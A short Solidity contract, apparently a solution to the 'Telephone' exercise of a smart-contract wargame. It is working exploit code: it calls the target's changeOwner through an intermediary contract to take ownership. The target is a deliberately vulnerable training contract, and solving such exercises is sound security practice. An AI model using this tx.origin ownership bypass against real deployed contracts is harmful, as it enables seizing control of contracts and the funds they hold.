// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import './Telephone.sol';

contract ExoFour {
  Telephone telephone;

  constructor(address contractAddress) public {
    telephone = Telephone(contractAddress);
  }

  function takeOwnership(address _accountAddress) public {
    telephone.changeOwner(_accountAddress);
  }
}
